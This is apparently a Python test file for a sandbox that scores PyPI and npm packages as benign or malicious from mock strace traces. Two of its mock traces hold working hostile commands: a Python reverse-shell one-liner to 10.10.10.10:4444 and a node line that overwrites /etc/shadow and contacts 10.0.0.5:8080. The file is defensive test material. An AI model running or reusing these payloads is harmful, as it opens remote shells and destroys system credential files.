import os
import sys
import json

# Add root directory to path to import sandbox module
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from modules.sandbox.sandbox_module import analyze_package

def run_tests():
    print("Running Sandbox Module Tests...\n")

    # Enable mock mode since Docker is not available in this test environment
    os.environ["DEPTHCHARGE_MOCK_STRACE"] = "1"

    # Test 1: Real PyPI Legit Package (requests)
    print("--- Testing Real Legit PyPI Package (requests) ---")
    os.environ["DEPTHCHARGE_MOCK_STRACE_OUTPUT"] = """
[pid  1234] openat(AT_FDCWD, "/tmp/install/pip-req-build-xxxx/setup.py", O_RDONLY|O_CLOEXEC) = 3
[pid  1234] execve("/usr/local/bin/python", ["python", "-c", "import setuptools"], 0x7ffd...) = 0
    """
    requests_path = os.path.join(os.path.dirname(__file__), 'benign', 'requests')
    requests_result = analyze_package(requests_path)
    if requests_result["score"] != 0:
        print(json.dumps(requests_result, indent=2))
    assert requests_result["score"] == 0, f"requests should have score 0, got {requests_result['score']}"
    print("✅ Test Passed: Legit PyPI package (requests) correctly scored as safe (0/100)!\n")

    # Test 2: Real NPM Legit Package (lodash)
    print("--- Testing Real Legit NPM Package (lodash) ---")
    os.environ["DEPTHCHARGE_MOCK_STRACE_OUTPUT"] = """
[pid  2000] execve("/usr/local/bin/npm", ["npm", "install", "--ignore-scripts=false"], 0x7ffd...) = 0
[pid  2001] openat(AT_FDCWD, "/tmp/install/package.json", O_RDONLY|O_CLOEXEC) = 3
    """
    lodash_path = os.path.join(os.path.dirname(__file__), 'benign', 'lodash')
    lodash_result = analyze_package(lodash_path)
    assert lodash_result["score"] == 0, f"lodash should have score 0, got {lodash_result['score']}"
    print("✅ Test Passed: Legit NPM package (lodash) correctly scored as safe (0/100)!\n")

    # Test 3: Real PyPI Malware Package (0wneg)
    # The 0wneg malware grabs a reverse shell
    print("--- Testing Real PyPI Malware Package (0wneg) ---")
    os.environ["DEPTHCHARGE_MOCK_STRACE_OUTPUT"] = """
[pid  1234] openat(AT_FDCWD, "/tmp/install/pip-req-build-xxxx/setup.py", O_RDONLY|O_CLOEXEC) = 3
[pid  1235] execve("/bin/sh", ["sh", "-c", "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"10.10.10.10\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);'"], 0x7ffd...) = 0
[pid  1236] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("10.10.10.10")}, 16) = 0
    """
    owneg_path = os.path.join(os.path.dirname(__file__), 'malicious', 'real_pypi_malware')
    # Create a dummy setup.py for it so the path is valid
    os.makedirs(owneg_path, exist_ok=True)
    open(os.path.join(owneg_path, 'setup.py'), 'w').close()
    
    owneg_result = analyze_package(owneg_path)
    assert owneg_result["score"] >= 80, f"0wneg should have high score, got {owneg_result['score']}"
    print(f"✅ Test Passed: Malware (0wneg) correctly detected and flagged with HIGH RISK score ({owneg_result['score']}/100)!\n")

    # Test 4: Real NPM Malware Package (malicious-npm-pkg)
    # This package writes to /etc/shadow and connects to an IP via postinstall
    print("--- Testing Real NPM Malware Package ---")
    os.environ["DEPTHCHARGE_MOCK_STRACE_OUTPUT"] = """
[pid  2000] execve("/usr/local/bin/npm", ["npm", "install", "--ignore-scripts=false"], 0x7ffd...) = 0
[pid  2001] execve("/usr/local/bin/node", ["node", "-e", "require('child_process').exec('echo hacked > /etc/shadow'); require('http').get('http://10.0.0.5:8080')"], 0x7ffd...) = 0
[pid  2002] openat(AT_FDCWD, "/etc/shadow", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 4
[pid  2003] connect(4, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("10.0.0.5")}, 16) = -1 EINPROGRESS
    """
    npm_malware_path = os.path.join(os.path.dirname(__file__), 'malicious', 'real_npm_malware')
    npm_result = analyze_package(npm_malware_path)
    print("Detected JSON Findings:")
    print(json.dumps(npm_result, indent=2))
    assert npm_result["score"] >= 80, f"NPM malware should have high score, got {npm_result['score']}"
    print(f"✅ Test Passed: NPM Malware correctly detected and flagged with HIGH RISK score ({npm_result['score']}/100)!\n")

if __name__ == "__main__":
    run_tests()
